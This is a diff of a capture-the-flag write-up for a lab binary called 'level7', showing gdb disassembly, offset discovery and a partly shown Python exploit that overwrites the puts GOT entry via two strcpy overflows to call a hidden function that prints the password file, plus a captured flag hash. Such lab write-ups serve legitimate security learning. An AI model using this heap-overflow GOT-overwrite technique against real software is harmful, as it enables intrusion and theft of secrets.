@@ -1,21 +1,56 @@
-In this binary, we can see a global variable `c` that will contain our flag.
+$ ./level7
+=> Segmentation fault (core dumped)
+$ ./level7 asdfasdf
+=> Segmentation fault (core dumped)
+$ ./level7 asdfasdf adsfasdf
+=> ~~
 
-There are 2 malloc'ed pointers that will respectively receive argv[1] and
-argv[2].
+ disas the <main>
+$ gdb level7
+$ (gdb) disas main
+   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
+   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
+   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
+   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
+   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
+   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
+   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
+   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
+   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
 
-At the end of the file, there is a dummy `puts` function call.
-Maybe we can use a ROP (Return-Oriented Programming) attack.
+As we observe we can also find another function that is not called in the main :
+$ objdump -d level7
+=> 080484f4 <m>
+$ (gdb) disas m
+   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
 
-There are 2 strcpy() function calls.
-On the first one, we can overflow with the goal to overwrite the 1st argument in
-the 2nd strcpy() function call. The point is, if we change the argument of
-strcpy(), we can overwrite anything.
+Basically, as we reassemble the source code, we understand that the program is using 2 <strcpy> that'll be usefull for our exploit cause they use our 2 first arguments.
 
-Since the strcpy() function calls are executed before reading the flag, the only
-address that is interesting to overwrite is the puts() function call.
+in an other hand, we have a fgets function that will copy the content of this file "/home/user/level8/.pass" into the c global variable.
 
-Instead of calling puts function call, we can call m function. That prints out
-the flag.
+variable who's called and printed in the m function. So we have to exploit our strcpy and find a way to change to overwrite the address of the <puts> function to the address of our <m> function.
+
+so first we got to find our puts address :
+$ (gdb) disas puts
+       0x08048400 <+0>:	jmp    *0x8049928
+0x8049928 That's the address where <puts@plt> jump.
+
+$ (gdb) disas m
+   0x080484f4 <+0>:	push   %ebp
+0x080484f4 That's the address of <m>.
+
+Now, thanks to our 2 strcpy, we'll be able to overwrite 
+this : 0x8049928 <puts>
+by this : 0x080484f4 <m>
+
+We first look for the offset :
+$ gdb level7
+$ (gdb) r 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP' 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP'
+$ (gdb) info reg
+    edx            0x46464646	1179010630
+edx is overwritten at FFFF, so the offset is 20.
+
+We'll then end up with a script like this :
 
 ```python
 #! /usr/bin/env python
@@ -30,4 +65,5 @@ print PAD + DEST + " " +  M_ADDR
 ```bash
 ./level7 $(python exploit.py)
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1676284714
 ```
